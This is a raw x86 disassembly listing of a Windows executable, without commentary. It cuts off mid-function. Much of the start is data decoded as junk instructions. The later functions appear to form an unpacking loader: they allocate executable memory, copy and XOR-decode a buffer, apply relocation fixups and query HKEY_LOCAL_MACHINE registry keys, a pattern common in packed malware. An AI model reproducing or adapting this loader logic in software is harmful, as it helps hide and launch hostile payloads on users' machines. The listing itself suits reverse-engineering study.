  41a7a5:	arpl   WORD PTR ds:0x5630000,ax
	...
  41a7bb:	add    BYTE PTR [ebx+0x5],ah
  41a7be:	add    BYTE PTR [eax],al
  41a7c0:	arpl   WORD PTR ds:0x5630000,ax
  41a7c6:	add    BYTE PTR [eax],al
  41a7c8:	arpl   WORD PTR ds:0x5630000,ax
  41a7ce:	add    BYTE PTR [eax],al
  41a7d0:	arpl   WORD PTR ds:0x5630000,ax
  41a7d6:	add    BYTE PTR [eax],al
  41a7d8:	arpl   WORD PTR ds:0x5630000,ax
  41a7de:	add    BYTE PTR [eax],al
  41a7e0:	arpl   WORD PTR ds:0x5630000,ax
  41a7e6:	add    BYTE PTR [eax],al
  41a7e8:	arpl   WORD PTR ds:0x5630000,ax
  41a7ee:	add    BYTE PTR [eax],al
  41a7f0:	arpl   WORD PTR ds:0x5630000,ax
  41a7f6:	add    BYTE PTR [eax],al
  41a7f8:	arpl   WORD PTR ds:0x5630000,ax
  41a7fe:	add    BYTE PTR [eax],al
  41a800:	arpl   WORD PTR ds:0x5630000,ax
  41a806:	add    BYTE PTR [eax],al
  41a808:	arpl   WORD PTR ds:0x5630000,ax
  41a80e:	add    BYTE PTR [eax],al
  41a810:	arpl   WORD PTR ds:0x5630000,ax
  41a816:	add    BYTE PTR [eax],al
  41a818:	arpl   WORD PTR ds:0x2000000,ax
  41a81e:	add    BYTE PTR [eax],al
  41a820:	arpl   WORD PTR ds:0x57b0000,ax
  41a826:	add    BYTE PTR [eax],al
  41a828:	fbstp  TBYTE PTR [edi]
  41a82a:	nop
  41a82b:	xor    ch,bh
  41a82d:	aaa    
  41a82e:	cwde   
  41a82f:	xor    bl,bh
  41a831:	aaa    
  41a832:	mov    al,ds:0xa837bf32
  41a837:	xor    ah,BYTE PTR [ebx+0x45]
  41a83a:	add    DWORD PTR [eax],eax
  41a83c:	adc    eax,DWORD PTR ds:0x3f400000
  41a842:	dec    ebx
  41a843:	cmp    esi,DWORD PTR [ebx-0x53c4a5c2]
  41a849:	ds push 0x933eb53b
  41a84f:	cmp    ebx,ebp
  41a851:	cmp    eax,0x3e1f3ba8
  41a856:	in     eax,dx
  41a857:	cmp    ebx,DWORD PTR [eax+0x39]
  41a85a:	adc    DWORD PTR [edx+ecx*2],edi
  41a85d:	cmp    DWORD PTR [ebp-0x78c838c4],ebx
  41a863:	ds out 0x3a,al
  41a866:	xchg   ebp,eax
  41a867:	ds daa 
  41a869:	cmp    ecx,ebp
  41a86b:	ds cld 
  41a86d:	cmp    bh,BYTE PTR [esi+0x3f]
  41a870:	loopne 0x41a8ab
  41a872:	fwait
  41a873:	aas    
  41a874:	retf   0xaf39
  41a877:	aas    
  41a878:	lods   al,BYTE PTR ds:[esi]
  41a879:	cmp    esp,ecx
  41a87b:	aas    
  41a87c:	adc    DWORD PTR [edx],edi
  41a87e:	out    0x3f,al
  41a880:	sar    BYTE PTR [ecx],cl
  41a882:	stc    
  41a883:	aas    
	...
  41a890:	add    BYTE PTR [eax],al
  41a892:	add    ah,dl
  41a894:	cmp    DWORD PTR [eax],eax
  41a896:	add    BYTE PTR [ebx+0x55],ah
  41a899:	add    DWORD PTR [eax],eax
  41a89b:	syscall 
  41a89d:	add    BYTE PTR [eax],al
  41a89f:	xor    ax,0x3018
  41a8a3:	loop   0x41a8d9
  41a8a5:	xchg   DWORD PTR [eax],esi
  41a8a7:	and    eax,0x6314b34
  41a8ac:	xor    al,0x66
  41a8ae:	xor    DWORD PTR [ebx],edx
  41a8b0:	xor    al,0x8d
  41a8b2:	xor    DWORD PTR [edi-0x5ece55cd],edi
  41a8b8:	xor    esp,ecx
  41a8ba:	xor    DWORD PTR [ebp+0x37],edx
  41a8bd:	pop    ss
  41a8be:	xor    bl,BYTE PTR [edi+0x37]
  41a8c1:	and    esi,DWORD PTR [edx]
  41a8c3:	cmp    dh,BYTE PTR [edi]
  41a8c5:	inc    edx
  41a8c6:	xor    bl,BYTE PTR [ebx]
  41a8c8:	aaa    
  41a8c9:	push   ecx
  41a8ca:	xor    cl,BYTE PTR [edi+esi*1]
  41a8cd:	pop    esi
  41a8ce:	xor    cl,dh
  41a8d0:	xor    edi,DWORD PTR [ebp+0x32]
  41a8d3:	loope  0x41a908
  41a8d5:	xchg   esp,eax
  41a8d6:	xor    ch,dh
  41a8d8:	xor    esp,DWORD PTR [edi-0x3dcbf2ce]
  41a8de:	xor    dl,BYTE PTR [ebx]
  41a8e0:	xor    al,0x8
  41a8e2:	xor    esp,DWORD PTR [ebp+0x34]
  41a8e5:	adc    al,0x33
  41a8e7:	xchg   BYTE PTR [edx+ebp*1],dh
  41a8ea:	xor    esp,DWORD PTR [ecx-0x14cc81cc]
  41a8f0:	xor    al,0x95
  41a8f2:	xor    eax,edx
  41a8f4:	xor    al,0xab
  41a8f6:	xor    eax,DWORD PTR [eax]
	...
  41a904:	add    BYTE PTR [eax],al
  41a906:	xlat   BYTE PTR ds:[ebx]
  41a907:	xor    al,0xbe
  41a909:	xor    ebx,DWORD PTR [edx]
  41a90b:	xor    eax,0x351733ce
  41a910:	fnsave [ebx]
  41a912:	add    al,0x35
  41a914:	hlt    
  41a915:	xor    ebp,ecx
  41a917:	xor    al,0xff
  41a919:	xor    ebx,DWORD PTR [esi+0x31]
  41a91c:	or     DWORD PTR [ebp*2-0x7ecbebcf],esi
  41a923:	xor    DWORD PTR [eax],ebp
  41a925:	xor    al,0x7e
  41a927:	xor    DWORD PTR [edx],esi
  41a929:	xor    al,0x14
  41a92b:	xor    DWORD PTR [edx+0x34],ebx
  41a92e:	in     eax,0x31
  41a930:	mov    WORD PTR [ecx+edx*8],?
  41a933:	xor    DWORD PTR [esp+esi*1+0x34eb31a5],ebx
  41a93a:	stos   DWORD PTR es:[edi],eax
  41a93b:	xor    DWORD PTR [esi*1+0x35233275],ecx
  41a942:	dec    edx
  41a943:	xor    dh,BYTE PTR [ecx]
  41a945:	xor    eax,0x3544324a
  41a94a:	pop    ss
  41a94b:	xor    bl,BYTE PTR [ebp+0x35]
  41a94e:	add    DWORD PTR [edx],esi
  41a950:	jno    0x41a987
  41a952:	fidiv  WORD PTR [edx]
  41a954:	mov    ?,WORD PTR ds:0x35a532d5
  41a95a:	arpl   WORD PTR ds:0x5630000,ax
  41a960:	add    BYTE PTR [eax],al
  41a962:	arpl   WORD PTR ds:0x5630000,ax
	...
  41a978:	add    BYTE PTR [ebx+0x5],ah
  41a97b:	add    BYTE PTR [eax],al
  41a97d:	arpl   WORD PTR ds:0x5630000,ax
  41a983:	add    BYTE PTR [eax],al
  41a985:	arpl   WORD PTR ds:0x5630000,ax
  41a98b:	add    BYTE PTR [eax],al
  41a98d:	arpl   WORD PTR ds:0x5630000,ax
  41a993:	add    BYTE PTR [eax],al
  41a995:	arpl   WORD PTR ds:0x5630000,ax
  41a99b:	add    BYTE PTR [eax],al
  41a99d:	arpl   WORD PTR ds:0x5630000,ax
  41a9a3:	add    BYTE PTR [eax],al
  41a9a5:	arpl   WORD PTR ds:0x5630000,ax
  41a9ab:	add    BYTE PTR [eax],al
  41a9ad:	arpl   WORD PTR ds:0x5630000,ax
  41a9b3:	add    BYTE PTR [eax],al
  41a9b5:	arpl   WORD PTR ds:0x5630000,ax
  41a9bb:	add    BYTE PTR [eax],al
  41a9bd:	arpl   WORD PTR ds:0x5630000,ax
  41a9c3:	add    BYTE PTR [eax],al
  41a9c5:	arpl   WORD PTR ds:0x5630000,ax
  41a9cb:	add    BYTE PTR [eax],al
  41a9cd:	arpl   WORD PTR ds:0x5630000,ax
  41a9d3:	add    BYTE PTR [eax],al
  41a9d5:	arpl   WORD PTR ds:0x5630000,ax
	...
  41a9eb:	add    BYTE PTR [ebx+0x5],ah
  41a9ee:	add    BYTE PTR [eax],al
  41a9f0:	arpl   WORD PTR ds:0x5630000,ax
  41a9f6:	add    BYTE PTR [eax],al
  41a9f8:	arpl   WORD PTR ds:0x5630000,ax
  41a9fe:	add    BYTE PTR [eax],al
  41aa00:	arpl   WORD PTR ds:0x5630000,ax
  41aa06:	add    BYTE PTR [eax],al
  41aa08:	arpl   WORD PTR ds:0x5630000,ax
  41aa0e:	add    BYTE PTR [eax],al
  41aa10:	arpl   WORD PTR ds:0x5630000,ax
  41aa16:	add    BYTE PTR [eax],al
  41aa18:	arpl   WORD PTR ds:0x5630000,ax
  41aa1e:	add    BYTE PTR [eax],al
  41aa20:	arpl   WORD PTR ds:0x5630000,ax
  41aa26:	add    BYTE PTR [eax],al
  41aa28:	arpl   WORD PTR ds:0x5630000,ax
  41aa2e:	add    BYTE PTR [eax],al
  41aa30:	arpl   WORD PTR ds:0x5630000,ax
  41aa36:	add    BYTE PTR [eax],al
  41aa38:	arpl   WORD PTR ds:0x5630000,ax
  41aa3e:	add    BYTE PTR [eax],al
  41aa40:	arpl   WORD PTR ds:0x5630000,ax
  41aa46:	add    BYTE PTR [eax],al
  41aa48:	arpl   WORD PTR ds:0x5630000,ax
	...
  41aa5e:	add    BYTE PTR [ebx+0x5],ah
  41aa61:	add    BYTE PTR [eax],al
  41aa63:	arpl   WORD PTR ds:0x5630000,ax
  41aa69:	add    BYTE PTR [eax],al
  41aa6b:	int3   
  41aa6c:	int3   
  41aa6d:	int3   
  41aa6e:	int3   
  41aa6f:	int3   
  41aa70:	push   ebp
  41aa71:	mov    ebp,esp
  41aa73:	sub    esp,0xc
  41aa76:	mov    eax,DWORD PTR [ebp+0x8]
  41aa79:	mov    DWORD PTR [ebp-0x8],eax
  41aa7c:	mov    ecx,DWORD PTR [ebp+0xc]
  41aa7f:	mov    DWORD PTR [ebp-0xc],ecx
  41aa82:	mov    DWORD PTR [ebp-0x4],0x22b
  41aa89:	mov    edx,DWORD PTR [ebp-0x8]
  41aa8c:	cmp    edx,DWORD PTR [ebp-0xc]
  41aa8f:	jae    0x41aa9f
  41aa91:	mov    DWORD PTR [ebp-0x4],0x22b
  41aa98:	mov    eax,DWORD PTR [ebp-0x8]
  41aa9b:	jmp    0x41aaa9
  41aa9d:	jmp    0x41aaa9
  41aa9f:	mov    DWORD PTR [ebp-0x4],0x22b
  41aaa6:	mov    eax,DWORD PTR [ebp-0xc]
  41aaa9:	mov    esp,ebp
  41aaab:	pop    ebp
  41aaac:	ret    
  41aaad:	int3   
  41aaae:	int3   
  41aaaf:	int3   
  41aab0:	push   ebp
  41aab1:	mov    ebp,esp
  41aab3:	sub    esp,0xc
  41aab6:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  41aabd:	mov    DWORD PTR [ebp-0xc],0x3000
  41aac4:	mov    DWORD PTR [ebp-0x4],0x40
  41aacb:	mov    eax,DWORD PTR [ebp-0x4]
  41aace:	push   eax
  41aacf:	mov    ecx,DWORD PTR [ebp-0xc]
  41aad2:	push   ecx
  41aad3:	mov    edx,DWORD PTR [ebp+0x8]
  41aad6:	push   edx
  41aad7:	push   0x0
  41aad9:	push   0xffffffff
  41aadb:	call   DWORD PTR ds:0x401100
  41aae1:	mov    esp,ebp
  41aae3:	pop    ebp
  41aae4:	ret    
  41aae5:	int3   
  41aae6:	int3   
  41aae7:	int3   
  41aae8:	int3   
  41aae9:	int3   
  41aaea:	int3   
  41aaeb:	int3   
  41aaec:	int3   
  41aaed:	int3   
  41aaee:	int3   
  41aaef:	int3   
  41aaf0:	push   ebp
  41aaf1:	mov    ebp,esp
  41aaf3:	pop    ebp
  41aaf4:	ret    
  41aaf5:	int3   
  41aaf6:	int3   
  41aaf7:	int3   
  41aaf8:	int3   
  41aaf9:	int3   
  41aafa:	int3   
  41aafb:	int3   
  41aafc:	int3   
  41aafd:	int3   
  41aafe:	int3   
  41aaff:	int3   
  41ab00:	push   ebp
  41ab01:	mov    ebp,esp
  41ab03:	mov    DWORD PTR ds:0x4011ec,0x402004
  41ab0d:	pop    ebp
  41ab0e:	ret    
  41ab0f:	int3   
  41ab10:	push   ebp
  41ab11:	mov    ebp,esp
  41ab13:	mov    DWORD PTR ds:0x4011ec,0x41a820
  41ab1d:	pop    ebp
  41ab1e:	ret    
  41ab1f:	int3   
  41ab20:	push   ebp
  41ab21:	mov    ebp,esp
  41ab23:	mov    eax,DWORD PTR [ebp+0x8]
  41ab26:	mov    eax,DWORD PTR [eax-0x4]
  41ab29:	pop    ebp
  41ab2a:	ret    
  41ab2b:	int3   
  41ab2c:	int3   
  41ab2d:	int3   
  41ab2e:	int3   
  41ab2f:	int3   
  41ab30:	push   ebp
  41ab31:	mov    ebp,esp
  41ab33:	mov    eax,DWORD PTR [ebp+0xc]
  41ab36:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab39:	movzx  eax,WORD PTR [ecx+eax*2]
  41ab3d:	pop    ebp
  41ab3e:	ret    
  41ab3f:	int3   
  41ab40:	push   ebp
  41ab41:	mov    ebp,esp
  41ab43:	sub    esp,0xc
  41ab46:	mov    DWORD PTR [ebp-0x4],0x0
  41ab4d:	jmp    0x41ab58
  41ab4f:	mov    eax,DWORD PTR [ebp-0x4]
  41ab52:	add    eax,0x1
  41ab55:	mov    DWORD PTR [ebp-0x4],eax
  41ab58:	mov    ecx,DWORD PTR [ebp-0x4]
  41ab5b:	cmp    ecx,DWORD PTR [ebp+0x8]
  41ab5e:	jae    0x41abc3
  41ab60:	mov    edx,DWORD PTR [ebp-0x4]
  41ab63:	push   edx
  41ab64:	mov    eax,DWORD PTR [ebp+0xc]
  41ab67:	push   eax
  41ab68:	call   0x41ab30
  41ab6d:	add    esp,0x8
  41ab70:	sar    eax,0xc
  41ab73:	cmp    eax,0x3
  41ab76:	jne    0x41abc1
  41ab78:	mov    DWORD PTR [ebp-0xc],0xfff
  41ab7f:	mov    ecx,DWORD PTR [ebp-0x4]
  41ab82:	push   ecx
  41ab83:	mov    edx,DWORD PTR [ebp+0xc]
  41ab86:	push   edx
  41ab87:	call   0x41ab30
  41ab8c:	add    esp,0x8
  41ab8f:	and    eax,DWORD PTR [ebp-0xc]
  41ab92:	add    eax,0x2d23
  41ab97:	mov    DWORD PTR [ebp-0x8],eax
  41ab9a:	mov    eax,DWORD PTR [ebp+0x18]
  41ab9d:	mov    ecx,DWORD PTR [ebp+0x10]
  41aba0:	add    ecx,DWORD PTR [eax]
  41aba2:	mov    edx,DWORD PTR [ebp-0x8]
  41aba5:	mov    eax,DWORD PTR [ecx+edx*1-0x2d23]
  41abac:	add    eax,DWORD PTR [ebp+0x14]
  41abaf:	mov    ecx,DWORD PTR [ebp+0x18]
  41abb2:	mov    edx,DWORD PTR [ebp+0x10]
  41abb5:	add    edx,DWORD PTR [ecx]
  41abb7:	mov    ecx,DWORD PTR [ebp-0x8]
  41abba:	mov    DWORD PTR [edx+ecx*1-0x2d23],eax
  41abc1:	jmp    0x41ab4f
  41abc3:	mov    esp,ebp
  41abc5:	pop    ebp
  41abc6:	ret    
  41abc7:	int3   
  41abc8:	int3   
  41abc9:	int3   
  41abca:	int3   
  41abcb:	int3   
  41abcc:	int3   
  41abcd:	int3   
  41abce:	int3   
  41abcf:	int3   
  41abd0:	push   ebp
  41abd1:	mov    ebp,esp
  41abd3:	sub    esp,0x30
  41abd6:	mov    DWORD PTR [ebp-0x8],0x11cb
  41abdd:	mov    DWORD PTR [ebp-0x10],0x0
  41abe4:	jmp    0x41abef
  41abe6:	mov    eax,DWORD PTR [ebp-0x10]
  41abe9:	add    eax,0x4
  41abec:	mov    DWORD PTR [ebp-0x10],eax
  41abef:	mov    ecx,DWORD PTR [ebp-0x10]
  41abf2:	cmp    ecx,DWORD PTR [ebp+0xc]
  41abf5:	jae    0x41acb6
  41abfb:	mov    DWORD PTR [ebp-0x8],0x4189
  41ac02:	cmp    DWORD PTR [ebp-0x10],0x0
  41ac06:	jne    0x41ac58
  41ac08:	push   0x104
  41ac0d:	push   0x4011f0
  41ac12:	call   DWORD PTR ds:0x401104
  41ac18:	push   0x401000
  41ac1d:	push   0x4011f0
  41ac22:	call   DWORD PTR ds:0x401108
  41ac28:	push   0x0
  41ac2a:	push   0x80
  41ac2f:	push   0x3
  41ac31:	push   0x0
  41ac33:	push   0x3
  41ac35:	push   0x1
  41ac37:	push   0x4011f0
  41ac3c:	call   DWORD PTR ds:0x40110c
  41ac42:	mov    DWORD PTR [ebp-0x4],eax
  41ac45:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  41ac49:	je     0x41ac51
  41ac4b:	cmp    DWORD PTR [ebp-0x4],0x0
  41ac4f:	jne    0x41ac58
  41ac51:	mov    eax,0x42
  41ac56:	jmp    0x41acb6
  41ac58:	mov    edx,DWORD PTR [ebp-0x10]
  41ac5b:	add    edx,0x563
  41ac61:	mov    DWORD PTR [ebp-0x28],edx
  41ac64:	mov    eax,DWORD PTR [ebp-0x28]
  41ac67:	mov    DWORD PTR [ebp-0x24],eax
  41ac6a:	mov    ecx,DWORD PTR [ebp-0x24]
  41ac6d:	mov    DWORD PTR [ebp-0x20],ecx
  41ac70:	mov    edx,DWORD PTR [ebp-0x20]
  41ac73:	mov    DWORD PTR [ebp-0x1c],edx
  41ac76:	mov    eax,DWORD PTR [ebp-0x1c]
  41ac79:	mov    DWORD PTR [ebp-0x30],eax
  41ac7c:	mov    ecx,DWORD PTR [ebp-0x30]
  41ac7f:	mov    DWORD PTR [ebp-0x14],ecx
  41ac82:	mov    edx,DWORD PTR [ebp-0x10]
  41ac85:	mov    DWORD PTR [ebp-0x18],edx
  41ac88:	mov    eax,DWORD PTR [ebp+0x8]
  41ac8b:	add    eax,DWORD PTR [ebp-0x10]
  41ac8e:	mov    DWORD PTR [ebp-0x2c],eax
  41ac91:	mov    ecx,DWORD PTR [ebp-0x2c]
  41ac94:	mov    edx,DWORD PTR [ecx]
  41ac96:	add    edx,DWORD PTR [ebp-0x18]
  41ac99:	mov    eax,DWORD PTR [ebp-0x2c]
  41ac9c:	mov    DWORD PTR [eax],edx
  41ac9e:	mov    ecx,DWORD PTR [ebp+0x8]
  41aca1:	add    ecx,DWORD PTR [ebp-0x10]
  41aca4:	mov    edx,DWORD PTR [ecx]
  41aca6:	xor    edx,DWORD PTR [ebp-0x14]
  41aca9:	mov    eax,DWORD PTR [ebp+0x8]
  41acac:	add    eax,DWORD PTR [ebp-0x10]
  41acaf:	mov    DWORD PTR [eax],edx
  41acb1:	jmp    0x41abe6
  41acb6:	mov    esp,ebp
  41acb8:	pop    ebp
  41acb9:	ret    
  41acba:	int3   
  41acbb:	int3   
  41acbc:	int3   
  41acbd:	int3   
  41acbe:	int3   
  41acbf:	int3   
  41acc0:	push   ebp
  41acc1:	mov    ebp,esp
  41acc3:	sub    esp,0x14
  41acc6:	mov    eax,DWORD PTR [ebp+0x8]
  41acc9:	cmp    DWORD PTR [eax+0x4],0x0
  41accd:	je     0x41ad17
  41accf:	mov    DWORD PTR [ebp-0x14],0x2a1
  41acd6:	mov    ecx,DWORD PTR [ebp+0x8]
  41acd9:	mov    edx,DWORD PTR [ecx+0x4]
  41acdc:	sub    edx,0x8
  41acdf:	shr    edx,1
  41ace1:	mov    DWORD PTR [ebp-0xc],edx
  41ace4:	mov    eax,DWORD PTR [ebp+0x8]
  41ace7:	add    eax,0x8
  41acea:	mov    DWORD PTR [ebp-0x10],eax
  41aced:	mov    ecx,DWORD PTR [ebp+0x8]
  41acf0:	push   ecx
  41acf1:	mov    edx,DWORD PTR [ebp+0x10]
  41acf4:	push   edx
  41acf5:	mov    eax,DWORD PTR [ebp+0xc]
  41acf8:	push   eax
  41acf9:	mov    ecx,DWORD PTR [ebp-0x10]
  41acfc:	push   ecx
  41acfd:	mov    edx,DWORD PTR [ebp-0xc]
  41ad00:	push   edx
  41ad01:	call   0x41ab40
  41ad06:	add    esp,0x14
  41ad09:	mov    eax,DWORD PTR [ebp+0x8]
  41ad0c:	mov    ecx,DWORD PTR [ebp+0x8]
  41ad0f:	add    ecx,DWORD PTR [eax+0x4]
  41ad12:	mov    DWORD PTR [ebp+0x8],ecx
  41ad15:	jmp    0x41acc6
  41ad17:	mov    esp,ebp
  41ad19:	pop    ebp
  41ad1a:	ret    
  41ad1b:	int3   
  41ad1c:	int3   
  41ad1d:	int3   
  41ad1e:	int3   
  41ad1f:	int3   
  41ad20:	push   ebp
  41ad21:	mov    ebp,esp
  41ad23:	sub    esp,0x10
  41ad26:	mov    DWORD PTR [ebp-0x10],0x60
  41ad2d:	mov    DWORD PTR [ebp-0x4],0x40102c
  41ad34:	push   0x0
  41ad36:	call   DWORD PTR ds:0x401120
  41ad3c:	test   eax,eax
  41ad3e:	jne    0x41ad44
  41ad40:	xor    eax,eax
  41ad42:	jmp    0x41adc0
  41ad44:	mov    DWORD PTR [ebp-0x10],0x42
  41ad4b:	mov    eax,ds:0x401128
  41ad50:	mov    ds:0x4012f4,eax
  41ad55:	mov    DWORD PTR [ebp-0x10],0x6
  41ad5c:	mov    ecx,DWORD PTR [ebp-0x4]
  41ad5f:	mov    BYTE PTR [ecx+0x1],0x4f
  41ad63:	lea    edx,[ebp-0xc]
  41ad66:	push   edx
  41ad67:	mov    eax,DWORD PTR [ebp-0x4]
  41ad6a:	push   eax
  41ad6b:	push   0x80000002
  41ad70:	call   DWORD PTR ds:0x4012f4
  41ad76:	test   eax,eax
  41ad78:	je     0x41ad7e
  41ad7a:	xor    eax,eax
  41ad7c:	jmp    0x41adc0
  41ad7e:	mov    DWORD PTR [ebp-0x10],0x60
  41ad85:	lea    ecx,[ebp-0xc]
  41ad88:	push   ecx
  41ad89:	push   0x401038
  41ad8e:	mov    edx,DWORD PTR [ebp-0xc]
  41ad91:	push   edx
  41ad92:	call   DWORD PTR ds:0x4012f4
  41ad98:	test   eax,eax
  41ad9a:	je     0x41ada0
  41ad9c:	xor    eax,eax
  41ad9e:	jmp    0x41adc0
  41ada0:	lea    eax,[ebp-0xc]
  41ada3:	push   eax
  41ada4:	push   0x40107c
  41ada9:	mov    ecx,DWORD PTR [ebp-0xc]
  41adac:	push   ecx
  41adad:	call   DWORD PTR ds:0x4012f4
  41adb3:	test   eax,eax
  41adb5:	jne    0x41adbb
  41adb7:	xor    eax,eax
  41adb9:	jmp    0x41adc0
  41adbb:	call   0x41ab00
  41adc0:	mov    esp,ebp
  41adc2:	pop    ebp
  41adc3:	ret    0x10
  41adc6:	int3   
  41adc7:	int3   
  41adc8:	int3   
  41adc9:	int3   
  41adca:	int3   
  41adcb:	int3   
  41adcc:	int3   
  41adcd:	int3   
  41adce:	int3   
  41adcf:	int3   
  41add0:	push   ebp
  41add1:	mov    ebp,esp
  41add3:	sub    esp,0x12c
  41add9:	mov    DWORD PTR [ebp-0x120],0x7c
  41ade3:	mov    DWORD PTR [ebp-0x114],0x0
  41aded:	mov    eax,ds:0x401110
  41adf2:	mov    DWORD PTR [ebp-0x4],eax
  41adf5:	push   0x104
  41adfa:	lea    ecx,[ebp-0x110]
  41ae00:	push   ecx
  41ae01:	call   DWORD PTR [ebp-0x4]
  41ae04:	mov    edx,DWORD PTR ds:0x401114
  41ae0a:	mov    DWORD PTR [ebp-0x124],edx
  41ae10:	mov    eax,ds:0x401118
  41ae15:	mov    DWORD PTR [ebp-0x118],eax
  41ae1b:	mov    DWORD PTR [ebp-0x128],0x0
  41ae25:	jmp    0x41ae36
  41ae27:	mov    ecx,DWORD PTR [ebp-0x128]
  41ae2d:	add    ecx,0x1
  41ae30:	mov    DWORD PTR [ebp-0x128],ecx
  41ae36:	mov    edx,DWORD PTR [ebp-0x128]
  41ae3c:	cmp    edx,DWORD PTR [ebp+0x10]
  41ae3f:	jge    0x41ae7a
  41ae41:	mov    eax,DWORD PTR [ebp+0xc]
  41ae44:	add    eax,DWORD PTR [ebp-0x128]
  41ae4a:	movzx  ecx,BYTE PTR [eax]
  41ae4d:	mov    DWORD PTR [ebp-0x12c],ecx
  41ae53:	mov    DWORD PTR [ebp-0x120],0x7c
  41ae5d:	mov    edx,DWORD PTR [ebp+0x8]
  41ae60:	add    edx,DWORD PTR [ebp-0x128]
  41ae66:	mov    al,BYTE PTR [ebp-0x12c]
  41ae6c:	mov    BYTE PTR [edx],al
  41ae6e:	mov    DWORD PTR [ebp-0x120],0x33
  41ae78:	jmp    0x41ae27
  41ae7a:	mov    esp,ebp
  41ae7c:	pop    ebp
  41ae7d:	ret    
  41ae7e:	int3   
  41ae7f:	int3   
  41ae80:	push   ebp
  41ae81:	mov    ebp,esp
  41ae83:	sub    esp,0x70
  41ae86:	mov    DWORD PTR ds:0x4012f8,ebp
  41ae8c:	pusha  
  41ae8d:	mov    DWORD PTR [ebp-0x3c],0x0
  41ae94:	mov    DWORD PTR [ebp-0x50],0x80000002
  41ae9b:	mov    DWORD PTR [ebp-0x14],0x0
  41aea2:	mov    DWORD PTR [ebp-0x34],0x64
  41aea9:	mov    DWORD PTR [ebp-0x1c],0xf
  41aeb0:	mov    DWORD PTR [ebp-0x3c],0x0
  41aeb7:	mov    DWORD PTR [ebp-0x24],0x0
  41aebe:	mov    DWORD PTR [ebp-0x30],0x1
  41aec5:	mov    DWORD PTR [ebp-0x18],0x3
  41aecc:	mov    DWORD PTR [ebp-0x14],0x0
  41aed3:	mov    DWORD PTR [ebp-0x34],0x64
  41aeda:	mov    DWORD PTR [ebp-0x1c],0xf
  41aee1:	mov    DWORD PTR [ebp-0x3c],0x0
  41aee8:	mov    DWORD PTR [ebp-0x24],0x0
  41aeef:	mov    DWORD PTR [ebp-0x30],0x1
  41aef6:	mov    DWORD PTR [ebp-0x18],0x3
  41aefd:	push   0x104
  41af02:	push   0x4011f0
  41af07:	call   DWORD PTR ds:0x401110
  41af0d:	push   0x37
  41af0f:	push   0x37
  41af11:	push   0x37
  41af13:	push   0x37
  41af15:	call   0x41ad20
  41af1a:	mov    eax,ds:0x4011ec
  41af1f:	push   eax
  41af20:	call   0x41ab20
  41af25:	add    esp,0x4
  41af28:	mov    DWORD PTR [ebp-0x40],eax
  41af2b:	mov    ecx,DWORD PTR [ebp-0x40]
  41af2e:	push   ecx
  41af2f:	call   0x41aab0
  41af34:	add    esp,0x4
  41af37:	mov    DWORD PTR [ebp-0x38],eax
  41af3a:	mov    edx,DWORD PTR [ebp-0x40]
  41af3d:	push   edx
  41af3e:	push   0x0
  41af40:	mov    eax,DWORD PTR [ebp-0x38]
  41af43:	push   eax
  41af44:	call   0x41aaf0
  41af49:	add    esp,0xc
  41af4c:	mov    ecx,DWORD PTR [ebp-0x40]
  41af4f:	mov    DWORD PTR [ebp-0x48],ecx
  41af52:	mov    edx,DWORD PTR [ebp-0x3c]
  41af55:	cmp    edx,DWORD PTR [ebp-0x40]
  41af58:	jae    0x41afa9
  41af5a:	mov    eax,DWORD PTR [ebp-0x48]
  41af5d:	push   eax
  41af5e:	mov    ecx,DWORD PTR [ebp-0x34]
  41af61:	push   ecx
  41af62:	call   0x41aa70
  41af67:	add    esp,0x8
  41af6a:	mov    DWORD PTR [ebp-0x4c],eax
  41af6d:	mov    edx,DWORD PTR [ebp-0x4c]
  41af70:	push   edx
  41af71:	mov    eax,ds:0x4011ec
  41af76:	add    eax,DWORD PTR [ebp-0x24]
  41af79:	push   eax
  41af7a:	mov    ecx,DWORD PTR [ebp-0x38]
  41af7d:	add    ecx,DWORD PTR [ebp-0x3c]
  41af80:	push   ecx
  41af81:	call   0x41add0
  41af86:	add    esp,0xc
  41af89:	mov    edx,DWORD PTR [ebp-0x1c]
  41af8c:	add    edx,DWORD PTR [ebp-0x34]
  41af8f:	add    edx,DWORD PTR [ebp-0x24]
  41af92:	mov    DWORD PTR [ebp-0x24],edx
  41af95:	mov    eax,DWORD PTR [ebp-0x3c]
  41af98:	add    eax,DWORD PTR [ebp-0x34]
  41af9b:	mov    DWORD PTR [ebp-0x3c],eax
  41af9e:	mov    ecx,DWORD PTR [ebp-0x48]
  41afa1:	sub    ecx,DWORD PTR [ebp-0x4c]
  41afa4:	mov    DWORD PTR [ebp-0x48],ecx
  41afa7:	jmp    0x41af52
  41afa9:	mov    edx,DWORD PTR [ebp-0x40]
  41afac:	push   edx
  41afad:	mov    eax,DWORD PTR [ebp-0x38]
  41afb0:	push   eax
  41afb1:	call   0x41abd0
  41afb6:	add    esp,0x8
  41afb9:	mov    DWORD PTR [ebp-0x24],0x0
  41afc0:	mov    DWORD PTR [ebp-0x60],0x0
  41afc7:	call   0x41ab10
  41afcc:	mov    ecx,DWORD PTR ds:0x4011ec
  41afd2:	push   ecx
  41afd3:	call   0x41ab20
  41afd8:	add    esp,0x4
  41afdb:	mov    DWORD PTR [ebp-0x64],eax
  41afde:	mov    edx,DWORD PTR [ebp-0x64]
  41afe1:	push   edx
  41afe2:	call   0x41aab0
  41afe7:	add    esp,0x4
  41afea:	mov    DWORD PTR [ebp-0x20],eax
  41afed:	mov    eax,DWORD PTR [ebp-0x64]
  41aff0:	push   eax
  41aff1:	push   0x0
  41aff3:	mov    ecx,DWORD PTR [ebp-0x20]
  41aff6:	push   ecx
  41aff7:	call   0x41aaf0
  41affc:	add    esp,0xc
  41afff:	mov    edx,DWORD PTR [ebp-0x64]
  41b002:	mov    DWORD PTR [ebp-0x6c],edx
  41b005:	mov    eax,DWORD PTR [ebp-0x60]
  41b008:	cmp    eax,DWORD PTR [ebp-0x64]
  41b00b:	jae    0x41b05d
  41b00d:	mov    ecx,DWORD PTR [ebp-0x6c]
  41b010:	push   ecx
  41b011:	mov    edx,DWORD PTR [ebp-0x34]
  41b014:	push   edx
  41b015:	call   0x41aa70
  41b01a:	add    esp,0x8
  41b01d:	mov    DWORD PTR [ebp-0x70],eax
  41b020:	mov    eax,DWORD PTR [ebp-0x70]
  41b023:	push   eax
  41b024:	mov    ecx,DWORD PTR ds:0x4011ec
  41b02a:	add    ecx,DWORD PTR [ebp-0x24]
  41b02d:	push   ecx
  41b02e:	mov    edx,DWORD PTR [ebp-0x20]
